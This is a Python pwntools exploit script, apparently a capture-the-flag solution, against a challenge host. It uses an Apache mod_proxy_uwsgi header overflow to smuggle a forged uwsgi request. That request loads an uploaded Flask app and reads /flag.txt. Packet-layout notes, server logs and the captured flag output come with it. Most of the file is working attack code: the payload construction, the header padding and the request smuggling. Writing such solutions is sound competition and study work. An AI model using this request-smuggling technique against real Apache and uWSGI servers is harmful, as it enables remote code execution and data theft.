#!/usr/bin/env python

from pwn import *
import requests
import sys

"""
The initial bug report at https://bugs.chromium.org/p/project-zero/issues/detail?id=2050 has
a pretty good summary of the issue along with the following: "If UWSGI is explicitly configured in persistent mode (puwsgi), this can
also be used to smuggle a second UWSGI request leading to remote code execution." which is how this app is setup.

The uwsgi protocol can be found at https://uwsgi-docs.readthedocs.io/en/latest/Protocol.html.

We can use the apache overflow to send an invalid "size of WSGI block vars" making it much shorter than it really is. 
The payload below will generate a packet that starts like:

0000: 0022 0000 0900 5041 5448 5f49 4e46 4f01 002f 0e00 434f 4e54 454e 545f 4c45 4e47  ."....PATH_INFO../..CONTENT_LENG
0020: 5448 0400 3830 3030 0f00 4854 5450 5f31 3030 3030 3030 3030 3021 0f30 3030 3030  TH..8000..HTTP_1000000000!.00000
0040: 3030 3030 3030 3030 3030 3030 3030 3030 3030 3030 3030 3030 3030 3030 3030 3030  00000000000000000000000000000000
0060: 3030 3030 3030 3030 3030 3030 3030 3030 3030 3030 3030 3030 3030 3030 3030 3030  00000000000000000000000000000000

The size packet is `00220000` which has a datasize (16-bit little endian) of 34, but apache still sends through all of the data.
That means the next packet will be looked for is in the middle of our header which is `3030 0f00`. The 0x0f comes from the length
of the http header name `HTTP_1000000000`. The packet modifier is 48 which is ignored, and the size is 3888 which will perfectly
align with the next header we sent and `3030 0f00` will be parsed again.

This repeats for all of the headers, and we make sure the final one is small enough to encompass any additional headers
sent by apaches so that our fake packet is the next one the be read.

app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | -- unavailable modifier requested: 48 --
app_1  | WSGI app 2 (mountpoint='/ggg') ready in 0 seconds on interpreter 0x55709719a8e0 pid: 7
web_1  | 172.30.0.1 - - [06/Dec/2020:23:28:41 +0000] "POST / HTTP/1.0" 200 1
app_1  | [pid: 7|app: 2|req: 1/21]  () {10 vars in 138 bytes} [Sun Dec  6 23:28:45 2020] GET  => generated 1 bytes in 4 msecs ( 200) 2 headers in 78 bytes (3 switches on core 0)
app_1  | uwsgi_proto_uwsgi_parser(): Success [proto/puwsgi.c line 56]
"""

# fake flask app to be injected
note = """#!/usr/bin/env python
from flask import Flask

application = Flask(__name__)


@application.route('/')
def index():
    with open("/flag.txt", "r") as f:
        return f.read()
"""

# upload fake app so it exists on the file system
resp = requests.get("http://simplenote.chal.perfect.blue/", params={"note": note})
note_hash = resp.url.split("/")[-1]

p = remote("simplenote.chal.perfect.blue", 80)

# generate a uwsgi header
def make_header(name, val):
    return p16(len(name)) + name + p16(len(val)) + val

# fake headers to inject our custom app
fake_headers = b"".join([
    make_header(b"UWSGI_FILE", "/tmp/notes/{}".format(note_hash).encode()),
    make_header(b"SERVER_NAME", b"localhost"),
    make_header(b"SCRIPT_NAME", b"/ggg"),
    make_header(b"SERVER_PORT", b"80"),
    make_header(b"REQUEST_METHOD", b"GET")
])

# our fake request to smuggle
fake_packet = b"\x00" + p16(len(fake_headers)) + b"\x00" + fake_headers

# hard part is to get everthing to align
post_data = b"\x00" * 628
post_data += fake_packet
post_data = post_data.ljust(8000, b"\x00")

payload = [
    b"POST / HTTP/1.0",
    "Content-Length: {}".format(len(post_data)).encode(),
]

PADDING = 2649
SIZE = 3873

headers = [
    b"1000000000:" + b"0" * SIZE,
    b"2000000000:" + b"0" * SIZE,
    b"3000000000:" + b"0" * SIZE,
    b"4000000000:" + b"0" * SIZE,
    b"5000000000:" + b"0" * SIZE,
    b"6000000000:" + b"0" * SIZE,
    b"7000000000:" + b"0" * SIZE,
    b"8000000000:" + b"0" * SIZE,
    b"9000000000:" + b"0" * SIZE,
    b"a000000000:" + b"0" * SIZE,
    b"b000000000:" + b"0" * SIZE,
    b"c000000000:" + b"0" * SIZE,
    b"d000000000:" + b"0" * SIZE,
    b"e000000000:" + b"0" * SIZE,
    b"f000000000:" + b"0" * SIZE,
    b"g000000000:" + b"0" * SIZE,
    b"h000000000:" + b"0" * (PADDING),
]

payload.extend(headers)
payload.extend([
    b"",
    post_data
])

payload = b"\r\n".join(payload)
p.send(payload)
print(p.recvall())

"""
[+] Opening connection to simplenote.chal.perfect.blue on port 80: Done
[+] Receiving all data: Done (205B)
[*] Closed connection to simplenote.chal.perfect.blue port 80
b'HTTP/1.1 200 OK\r\nDate: Sun, 06 Dec 2020 23:59:37 GMT\r\nServer: Apache/2.4.43 (Unix)\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: 40\r\nConnection: close\r\n\r\npbctf{pwn1n6_ap4ch3_i5_St1ll w3b r1gh7?}'
"""